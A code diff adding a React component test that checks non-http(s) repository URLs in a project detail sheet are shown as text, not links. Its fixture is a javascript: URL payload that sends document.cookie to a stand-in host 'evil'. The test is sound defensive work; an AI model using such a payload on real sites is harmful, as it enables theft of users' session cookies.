@@ -101,6 +101,21 @@ describe('ProjectDetailSheet', () => {
     expect(within(dialog()).queryByRole('link', { name: '사이트 방문' })).not.toBeInTheDocument();
   });
 
+  it('http(s)가 아닌 리포지토리는 링크로 걸지 않고 글자로만 보여 준다', async () => {
+    const safeRepo = 'https://github.com/themoment-team/datagsm-client';
+    const unsafeRepo = "javascript:fetch('//evil?'+document.cookie)";
+    mockProjectDetail(() => apiSuccess({ ...publicProject, repositories: [safeRepo, unsafeRepo] }));
+
+    renderWithProviders(<ProjectDetailSheet projectId={7} onClose={() => {}} />);
+
+    expect(await within(dialog()).findByRole('link', { name: safeRepo })).toHaveAttribute(
+      'href',
+      safeRepo,
+    );
+    expect(within(dialog()).getByText(unsafeRepo).closest('a')).toBeNull();
+    expect(within(dialog()).queryByRole('link', { name: unsafeRepo })).not.toBeInTheDocument();
+  });
+
   it('projectId가 null이면 시트를 열지 않고 조회도 하지 않는다', async () => {
     const requestedIds = mockProjectDetail(() => apiSuccess(publicProject));
 
